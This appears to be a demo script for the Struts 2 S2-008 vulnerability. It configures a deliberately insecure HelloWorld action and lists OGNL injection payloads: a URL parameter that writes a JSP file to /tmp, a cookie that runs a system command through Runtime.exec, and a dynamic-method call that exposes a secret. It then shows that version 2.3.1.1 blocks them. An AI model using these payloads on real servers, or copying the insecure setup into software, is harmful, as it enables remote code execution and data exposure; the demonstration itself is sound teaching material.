S2-008 example

Affected Struts 2.2.3 and below

Solved with Struts 2.3.1.1

http://localhost:8080/s2-009/example/HelloWorld.action

Action must have a field like below with getter/setter:

`private long id'

add result `input` for action HelloWorld as below
    <result name="input">/example/HelloWorld.jsp</result>

configure action HelloWorld to accept cookies like below:
    <interceptor-ref name="defaultStack"/>
    <interceptor-ref name="cookie">
	    <param name="cookiesName">*</param>
		<param name="cookiesValue">1,2</param>
    </interceptor-ref>

Add public method like below:

    public String getPassword() {
        return "Secret";
    }

Show vulnerability:
- change Struts2 version to 2.2.3
- start application: `mvn jetty:run`
- list file in `/tmp/` folder to show there is no file s2-008.jsp
- open browser
- paste url: http://localhost:8080/s2-008/example/HelloWorld.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter("/tmp/s2-008.jsp")).append("jsp+shell").close())%2b'
- there be a conversion error
- list `/tmp/` folder again to show that s2-008.jsp file was created and open it to show content
- add cookie: Cookie: (#_memberAccess["allowStaticMethodAccess"]\u003dtrue)(x[@java.lang.Runtime@getRuntime().exec('mate')])
- refresh browser
- show TextMate is running
- remove cookie
- paste url: http://localhost:8080/s2-008/example/HelloWorld!getPassword.action
- show `Secret` message on the page
- stop Jetty

Show solution:
- change Struts2 version to 2.3.1.1
- start application: `mvn jetty:run`
- list file in `/tmp/` folder to show there is no file hello.jsp
- open browser
- paste url: http://localhost:8080/s2-008/example/HelloWorld.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter("/tmp/s2-008.jsp")).append("jsp+shell").close())%2b'
- list `/tmp/` folder again to show there is no file s2-008.jsp
- add cookie: Cookie: (#_memberAccess["allowStaticMethodAccess"]\u003dtrue)(x[@java.lang.Runtime@getRuntime().exec('mate')])
- refresh browser
- show TextMate is not running
- stop Jetty
